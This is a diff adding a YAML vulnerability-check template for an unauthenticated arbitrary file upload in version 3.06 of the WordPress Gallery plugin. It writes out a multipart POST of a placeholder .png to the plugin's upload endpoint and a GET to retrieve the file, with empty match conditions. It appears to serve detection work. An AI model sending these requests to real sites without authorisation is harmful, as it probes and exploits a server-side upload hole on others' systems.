@@ -1,0 +1,32 @@
+id: wp-gallery-file-upload
+brief:
+    title: WordPress Plugin Gallery 3.06 - Arbitrary File Upload
+    by: r3Y3r53
+    level: high
+    about: The Gallery by BestWebSoft WordPress plugin was affected by an Unauthenticated File Upload PHP Code Execution security vulnerability.
+    label:
+        - wp
+        - wp-plugin
+        - wordpress
+        - wpscan
+        - file-upload
+        - intrusive
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/wp-content/plugins/gallery-plugin/upload/php.php'
+      head:
+        Content-Type: multipart/form-data; boundary=WebKitFormBoundary20kgW2hEKYaeF5iP
+      body: |-
+        --WebKitFormBoundary20kgW2hEKYaeF5iP
+        Content-Disposition: form-data; name="qqfile"; filename="{{filename}}.png"
+
+        {{randstr}}
+
+        --WebKitFormBoundary20kgW2hEKYaeF5iP--
+      signs: []
+    - verb: GET
+      to:
+        - '{{BaseURL}}/wp-content/plugins/gallery-plugin/upload/files/{{filename}}.png'
+      signs: []
